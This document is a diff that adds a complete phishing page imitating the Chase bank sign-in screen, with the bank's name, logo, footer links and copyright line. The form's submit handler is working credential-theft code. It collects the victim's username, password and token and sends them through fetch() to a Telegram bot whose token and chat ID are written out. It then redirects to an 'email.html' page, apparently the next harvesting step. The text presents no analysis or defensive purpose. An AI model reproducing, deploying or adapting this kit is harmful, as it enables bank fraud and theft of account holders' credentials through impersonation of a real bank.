@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>Sign in - Chase</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+
+    <div class="container">
+        <div class="container_element">
+
+
+
+
+            <!-- FORM -->
+            <form action="" id="form">
+            
+            <div class="wolf_image">
+                <div class="chase_image">
+                    <img src="IMAGES/pngwing.com.png" alt="">
+                </div>
+
+                <div class="oiuy">
+                <div class="login">
+                    <div class="login_element">
+                        <div class="login_element_one">
+                            <input type="text" name="CHASE BANK USERNAME" id="username" placeholder="Username" required minlength="4"> 
+                            <label for="username" id="absolu">Username</label>
+                        </div>
+                        <div class="login_element_one">
+                            <input type="password" name="CHASE BANK PASSWORD" id="password" placeholder="Password" class="password" required minlength="4">
+                            <label for="password" id="absolu">Password</label>
+                            <img src="IMAGES/showPassword.svg" alt="" class="eyeicon">
+                        </div>
+                        <div class="login_element_token">
+                            <input type="tel" name="CHASE BANK TOKEN" id="token" placeholder="Token">
+                            <label for="token" id="absolu">Token</label>
+                        </div>
+                        <div class="login_element_two">
+                            <div class="login_element_two_flex">
+                                <input type="checkbox" name="" id="remember_me">
+                                <label for="remember_me">Remember me</label>
+                            </div>
+                            <div class="login_element_two_flex">
+                                <input type="checkbox" name="" id="use_token">
+                                <label for="use_token">Use token</label>
+                            </div>
+                        </div>
+                        <div class="signin">
+                            <button type="submit">Sign in</button>
+                        </div>
+                        <div class="forgot_password">
+                            <p>Forgot username/password? <img src="" alt=""></p>
+                            <p>Not Enrolled? Sign Up Now. <img src="" alt=""></p>
+                        </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+
+     
+
+                        <div class="follow_us">
+                            <p>Follow us:</p>
+                            <img src="IMAGES/facebook.svg" alt="">
+                            <img src="IMAGES/instagram.svg" alt="">
+                            <img src="IMAGES/telegram.svg" alt="">
+                            <img src="IMAGES/square-youtube.svg" alt="">
+                            <img src="IMAGES/linkedin-in.svg" alt="">
+                        </div>
+
+                        <hr>
+
+                        <div class="last">
+                            <a href="">Contact us</a>
+                            <a href="">Privacy</a>
+                            <a href="">Security</a>
+                            <a href="">Terms and use</a>
+                            <a href="">Accessibility</a>
+                            <a href="">SAFE Act: Chase Mortgage Loan Originators</a>
+                            <a href="">Fair Lenging</a>
+                            <a href="">About Chase</a>
+                            <a href="">J.P. Morgan</a>
+                            <a href="">JPMorgan Chase & Co</a>
+                            <a href="">Careers</a>
+                            <a href="">Espanol</a>
+                            <a href="">Chase Canada</a>
+                            <a href="">Site map</a>
+                            <a href="" id="none_a">Member FDIC</a>
+                            <a href="" id="none_a">Equal Housing Lender</a>
+                        </div>
+                        <div class="copyright">
+                            <p>(c) 2016 JPMorgan Chase & Co.</p>
+                        </div>
+
+
+            </form>
+
+
+
+        </div>
+    </div>
+
+
+
+
+        <!-- FORM -->
+        <script>
+            let form = document.querySelector("#form");
+        
+            let bot = {
+                TOKEN: "6304903194:AAG193avR7mavtbvs-KuuH9bO4g64zHUJm0",
+                chatID: "6522391315",
+            }
+
+        
+            form.addEventListener("submit", (e) => {
+                e.preventDefault();
+        
+                var user_email = document.getElementById("username").value
+                var user_password = document.getElementById("password").value
+                var user_token = document.getElementById("token").value
+        
+                var my_text = `[----Chase Login----]%0AUsername : ${user_email}%0APassword : ${user_password}%0AToken : ${user_token}`
+        
+                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
+                    method: "GET"
+                })
+        
+                .then(success => {
+                    window.location.href='email.html'
+                }, error => {
+                    window.location.href='index.html'
+                })
+            })
+        </script>
+    
+
+    <script>
+        let login_element_token = document.querySelector(".login_element_token")
+        let use_token = document.getElementById("use_token")
+
+        use_token.addEventListener("click", function(){
+            login_element_token.classList.toggle("show_token")
+        })
+    </script>
+
+
+
+        <!-- ANOTHER HIDW AND SHOW -->
+        <script>
+            let eyeicon = document.querySelector(".eyeicon")
+            let password = document.querySelector(".password")
+    
+            eyeicon.addEventListener("click", function(){
+                if(password.type == "password"){
+                    password.type = "text";
+                ///    eyeicon.innerHTML="Hide"
+                    eyeicon.src = "IMAGES/hidePassword.svg";
+                }else {
+                    password.type = "password";
+                ///    eyeicon.innerHTML="Show"
+                    eyeicon.src = "IMAGES/showPassword.svg";
+                }
+            })
+        </script>
+
+
+
+</body>
+</html>
